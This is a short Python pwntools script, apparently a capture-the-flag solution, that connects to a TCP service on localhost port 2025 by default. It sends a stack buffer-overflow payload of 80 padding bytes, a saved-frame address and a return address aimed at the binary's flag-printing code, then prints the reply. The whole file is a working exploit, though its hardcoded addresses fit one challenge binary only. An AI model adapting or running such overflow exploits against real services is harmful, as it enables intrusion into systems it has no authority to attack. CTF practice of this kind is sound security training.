from pwn import *

# Default IP
default_ip = '127.0.0.1'
# Default port
default_port = 2025

# Get the IP and port from CLI args (or use default values)
target_ip = sys.argv[1] if len(sys.argv) > 1 else default_ip
target_port = int(sys.argv[2]) if len(sys.argv) > 2 else default_port

# Connecting to the TCP socket server
conn = remote(target_ip, target_port)

# Payload (returning to flag spitting logic)
payload = b"AAAABBBBCCCCDDDD" * 5 + p64(0x00007fffffffe0e0) + p64(0x0000000000401686)

# Sending payload
conn.send(payload)

# Dumping the flag (hopefully)
print(conn.recv().decode('utf-8'))

# Closing connection
conn.close()
